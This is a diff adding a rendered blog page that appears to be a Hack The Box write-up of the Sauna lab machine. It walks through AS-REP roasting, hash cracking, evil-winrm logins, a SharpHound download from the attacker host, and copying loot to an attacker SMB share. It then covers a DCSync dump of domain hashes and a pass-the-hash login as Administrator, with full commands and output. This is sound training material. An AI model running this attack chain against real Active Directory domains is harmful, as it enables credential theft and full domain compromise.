@@ -1,0 +1,343 @@
+I"9L<h2 id="enumeration">Enumeration</h2>
+<h3 id="nmap-scanning">Nmap Scanning</h3>
+<p><strong>Command</strong></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td> --><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/…/htb/Machines/vip/sauna]
+└─$ nmap -sC -sV 10.10.10.175 -oN nmap-scan 
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p><strong>Result</strong></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+</pre></td> --><td class="rouge-code"><pre># Nmap 7.93 scan initiated Mon Dec 19 14:22:37 2022 as: nmap -sC -sV -oN nmap-scan 10.10.10.175
+Nmap scan report for 10.10.10.175
+Host is up (0.25s latency).
+Not shown: 990 filtered tcp ports (no-response)
+PORT    STATE SERVICE       VERSION
+53/tcp  open  domain        Simple DNS Plus
+80/tcp  open  http          Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Egotistical Bank :: Home
+| http-methods: 
+|_  Potentially risky methods: TRACE
+88/tcp  open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-12-19 19:23:10Z)
+135/tcp open  msrpc         Microsoft Windows RPC
+139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
+445/tcp open  microsoft-ds?
+464/tcp open  kpasswd5?
+593/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp open  tcpwrapped
+Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: 8h00m00s
+| smb2-time: 
+|   date: 2022-12-19T19:23:27
+|_  start_date: N/A
+| smb2-security-mode: 
+|   311: 
+|_    Message signing enabled and required
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Mon Dec 19 14:24:08 2022 -- 1 IP address (1 host up) scanned in 91.13 seconds
+</pre></td></tr></tbody></table></code></pre></div></div>
+<h3 id="ports-enumeration">Ports Enumeration</h3>
+<h4 id="port-445-smb">Port 445 <code class="language-plaintext highlighter-rouge">smb</code></h4>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td> --><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/…/Machines/vip/sauna/creds]
+└─$ crackmapexec smb 10.10.10.175 
+SMB         10.10.10.175    445    SAUNA            [*] Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>Checking for <code class="language-plaintext highlighter-rouge">Shares</code></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td> --><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/…/Machines/vip/sauna/creds]
+└─$ crackmapexec smb 10.10.10.175  --shares
+SMB         10.10.10.175    445    SAUNA            [*] Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
+SMB         10.10.10.175    445    SAUNA            [-] Error enumerating shares: STATUS_USER_SESSION_DELETED
+</pre></td></tr></tbody></table></code></pre></div></div>
+<h4 id="port-80">Port 80</h4>
+<p><img src="/assets/img/sauna/01.png" alt="image" /></p>
+
+<p>If you visit to <code class="language-plaintext highlighter-rouge">about us</code> page the following page will pop up which seems to have some users of the system</p>
+
+<p><img src="/assets/img/sauna/02.png" alt="image" />
+After taking the names from the web i saved into <code class="language-plaintext highlighter-rouge">user.txt</code> file</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre></td> --><td class="rouge-code"><pre>Hugo Bea
+Fergus Smith 
+Shaun Coins 
+Sophie Driver 
+Bowie Taylor 
+Steven Kerb
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>But this is not the appropriate syntax for the usernames, then we can use a tool called <code class="language-plaintext highlighter-rouge">username-anarchy</code> to generate usernames.</p>
+
+<p><strong>Command</strong></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td> --><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/…/vip/sauna/creds/username-anarchy]
+└─$ ./username-anarchy --i ../users.txt -f first,flast,first.last,firstl &gt; ../uname.txt
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p><strong>Result</strong></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+</pre></td> --><td class="rouge-code"><pre>hugo
+hugo.bea
+hugob
+hbea
+fergus
+fergus.smith
+ferguss
+fsmith
+shaun
+shaun.coins
+shaunc
+scoins
+sophie
+sophie.driver
+sophied
+sdriver
+bowie
+bowie.taylor
+bowiet
+btaylor
+steven
+steven.kerb
+stevenk
+skerb
+</pre></td></tr></tbody></table></code></pre></div></div>
+<h3 id="using-username-to-obtain-user-hashes">Using username to obtain user hashes</h3>
+<p><strong>Command</strong></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td> --><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/…/vip/sauna/creds]
+└─$ impacket-GetNPUsers -no-pass -dc-ip 10.10.10.175 EGOTISTICAL-BANK.LOCAL/  -usersfile uname.txt
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p><strong>Result</strong></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td> --><td class="rouge-code"><pre>$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:03762bd7935f1917b6b08371606505ba$8817637ad8faa2a344c4ee0a7d63fa7ca7a2248301687fc78267580b0ac345628651dd04753d60abb60820379d59f78a137a577bc2ff25661ff7f362f58187c8e33a07c3f4bdfe336297d217f3b201cc5d510c9584588f2a72e1ba1c5959693a93940b59fc7cc32d1f998b6ce95dfb1f574669731400ed77c3fec40f5e8866738db9272cfffe821ce57dca16413ac54899e4229bc8947b4a554bb6cd18675a2c7842e881ca00dd1ebc7162df1650c24934a6a33f9177a23dec82d408d2a2b2847cdc078a2019d39daa518a66efbafec34cafa00613f3ca50027c298f9dd06362984418d263b5c6e58be60a047b9adfc648b6e8209e8c613a28052204e48c7b02
+</pre></td></tr></tbody></table></code></pre></div></div>
+<h3 id="cracking-hash">Cracking hash</h3>
+<p><strong>Command</strong></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td> --><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/…/Machines/vip/sauna/creds]
+└─$ john fsmith --wordlist=/usr/share/wordlists/rockyou.txt
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p><strong>Result</strong></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td> --><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/…/Machines/vip/sauna/creds]
+└─$ john --show fsmith                                     
+$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:Thestrokes23
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>Then password for user <code class="language-plaintext highlighter-rouge">fsmith</code> is <code class="language-plaintext highlighter-rouge">Thestrokes23</code></p>
+<h2 id="user-account">User Account</h2>
+<p>I tried to use the credentials that i have on <code class="language-plaintext highlighter-rouge">evil-winrm</code> and it succeed</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td> --><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/…/Machines/vip/sauna/creds]
+└─$ evil-winrm -i 10.10.10.175 -u fsmith -p Thestrokes23
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p><strong>User flag</strong></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td> --><td class="rouge-code"><pre>*Evil-WinRM* PS C:\Users\FSmith\Desktop&gt; type user.txt
+c8a9b1c97304************
+</pre></td></tr></tbody></table></code></pre></div></div>
+<h2 id="administrator-account">Administrator account.</h2>
+<p>Transfer <code class="language-plaintext highlighter-rouge">winPEASx64.exe</code> to the Windows machine resulted to the followings:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td> --><td class="rouge-code"><pre>ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for AutoLogon credentials                                                                                                                 
+    Some AutoLogon credentials were found                                                                                                                      
+    DefaultDomainName             :  EGOTISTICALBANK                                                                                                           
+    DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager                                                                                           
+    DefaultPassword               :  Moneymakestheworldgoround!
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>It found the credentials for the account <code class="language-plaintext highlighter-rouge">svc_loanmanager</code> with password <code class="language-plaintext highlighter-rouge">Moneymakestheworldgoround!</code></p>
+<h3 id="login-as-user-svc_loanmanager">Login as user svc_loanmanager</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td> --><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/…/htb/Machines/vip/sauna]
+└─$ evil-winrm -i 10.10.10.175 -u svc_loanmgr -p 'Moneymakestheworldgoround!'
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>Transfer <code class="language-plaintext highlighter-rouge">SharpHound.exe</code> into <code class="language-plaintext highlighter-rouge">evil-winrm</code></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre></td> --><td class="rouge-code"><pre># In Linux Machine
+┌──(gemstone㉿hashghost)-[~/…/vip/sauna/bloodhound/Collectors]
+└─$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.10.175 - - [19/Dec/2022 16:41:54] "GET /SharpHound.exe HTTP/1.1" 200 -
+
+
+# In Windows Machine
+*Evil-WinRM* PS C:\Users\svc_loanmgr\appdata\local\temp&gt; iwr http://10.10.14.3/SharpHound.exe -outf SharpHound.exe
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p><strong>Running SharpHound</strong></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td> --><td class="rouge-code"><pre>*Evil-WinRM* PS C:\Users\svc_loanmgr\appdata\local\temp&gt; .\SharpHound.exe -c all
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p><strong>Transfer .<code class="language-plaintext highlighter-rouge">zip</code> from Windowsto Linux</strong></p>
+<ol>
+  <li>Collecting data and transfer <code class="language-plaintext highlighter-rouge">.zip</code> from Windows machine to Linux machine.
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td> --><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/…/Machines/vip/sauna/bloodhound-data]
+└─$ impacket-smbserver graph . -smb2support -u  gems -password gemstone
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+  </li>
+  <li>In <code class="language-plaintext highlighter-rouge">evil-winrm</code>
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre></td> --><td class="rouge-code"><pre>*Evil-WinRM* PS C:\Users\svc_loanmgr\appdata\local\temp&gt; net use \\10.10.14.3\graph /u:gems gemstone
+The command completed successfully.
+*Evil-WinRM* PS C:\Users\svc_loanmgr\appdata\local\temp&gt; copy 20221219135043_BloodHound.zip \\10.10.14.3\graph
+*Evil-WinRM* PS C:\Users\svc_loanmgr\appdata\local\temp&gt; del 20221219135043_BloodHound.zip
+*Evil-WinRM* PS C:\Users\svc_loanmgr\appdata\local\temp&gt; net use /d \\10.10.14.3\graph
+\\10.10.14.3\graph was deleted successfully.
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+  </li>
+  <li>In Linux Machine
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td> --><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/…/Machines/vip/sauna/bloodhound-data]
+└─$ ls
+20221219135043_BloodHound.zip
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+    <h3 id="graphing-time-with-bloodhound">Graphing time with BloodHound</h3>
+    <p><img src="/assets/img/sauna/03.png" alt="image" /></p>
+  </li>
+</ol>
+
+<p>The user <code class="language-plaintext highlighter-rouge">SVC_LOANMGR@EGOTISTICAL-BANK.LOCAL</code> has the <code class="language-plaintext highlighter-rouge">DS-Replication-Get-Changes</code> and the <code class="language-plaintext highlighter-rouge">DS-Replication-Get-Changes-All privilege </code>on the domain <code class="language-plaintext highlighter-rouge">EGOTISTICAL-BANK.LOCAL</code>. These two privileges allow a principal to perform a DCSync attack.</p>
+
+<p><img src="/assets/img/sauna/04.png" alt="image" /></p>
+
+<p>Then we can use <code class="language-plaintext highlighter-rouge">impacket-secretsdump</code> to perform the attack mentioned by <code class="language-plaintext highlighter-rouge">bloodhound</code> to get the password hashes.</p>
+
+<p><strong>Command</strong></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td> --><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/…/htb/Machines/vip/sauna]                                                                                                          
+└─$ impacket-secretsdump  EGOTISTICAL-BANK.LOCAL/svc_loanmgr:'Moneymakestheworldgoround!'@10.10.10.175 
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p><strong>Result</strong></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td> --><td class="rouge-code"><pre>[*] Using the DRSUAPI method to get NTDS.DIT secrets                                                                                                           
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c::: 
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p><strong>Testing hash with crackmapexec</strong></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td> --><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/…/htb/Machines/vip/sauna]
+└─$ crackmapexec smb 10.10.10.175  -u administrator -H 823452073d75b9d1cf70ebdf86c7f98e
+SMB         10.10.10.175    445    SAUNA            [*] Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
+SMB         10.10.10.175    445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\administrator:823452073d75b9d1cf70ebdf86c7f98e (Pwn3d!)
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>It is <code class="language-plaintext highlighter-rouge">pwned</code> then we can use <code class="language-plaintext highlighter-rouge">impacket-psexec</code> to login as user <code class="language-plaintext highlighter-rouge">Adminitrator</code></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td> --><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/…/htb/Machines/vip/sauna]
+└─$ impacket-psexec  -hashes 823452073d75b9d1cf70ebdf86c7f98e:823452073d75b9d1cf70ebdf86c7f98e administrator@10.10.10.175  
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p><strong>Root flag</strong></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td> --><td class="rouge-code"><pre>C:\Users\Administrator\Desktop&gt; type root.txt
+2b0cfd0b554c***************
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>The end.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td> --><td class="rouge-code"><pre>Mungu Nisaidie
+</pre></td></tr></tbody></table></code></pre></div></div>
+:ET
